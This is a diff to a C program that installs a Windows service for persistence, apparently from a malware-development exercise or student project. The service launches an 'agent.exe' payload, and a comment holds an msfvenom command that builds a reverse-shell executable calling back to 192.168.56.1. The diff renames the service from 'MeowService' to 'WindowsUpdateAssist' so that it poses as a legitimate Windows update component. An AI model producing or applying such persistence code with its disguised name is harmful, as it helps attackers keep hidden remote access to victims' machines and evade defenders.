@@ -23,21 +23,22 @@ int RunMeow() {
 
   // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
   //char cmd[] = "Z:\\packtpub\\chapter03\\04-exploring-windows-services-for-persistence\\meow.exe";
-  char cmd[] = "C:\\Users\\abdul\\Downloads\\FYP\\task1\\agent.exe";
+  char cmd[] = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\agent.exe";
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory(&pi, sizeof(pi));
   CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-  WaitForSingleObject(pi.hProcess, INFINITE);
+  //WaitForSingleObject(pi.hProcess, INFINITE);
   CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread); // Also close the thread handle
   return 0;
 }
 
 int main() {
   SERVICE_TABLE_ENTRY ServiceTable[] = {
-    {"MeowService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
+    {"WindowsUpdateAssist", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
     {NULL, NULL}
   };
 
@@ -79,7 +80,7 @@ void ServiceMain(int argc, char** argv) {
   serviceStatus.dwCheckPoint         = 0;
   serviceStatus.dwWaitHint           = 0;
 
-  hStatus = RegisterServiceCtrlHandler("MeowService", (LPHANDLER_FUNCTION)ControlHandler);
+  hStatus = RegisterServiceCtrlHandler("WindowsUpdateAssist", (LPHANDLER_FUNCTION)ControlHandler);
 
   // --- CRITICAL CHANGE START ---
   
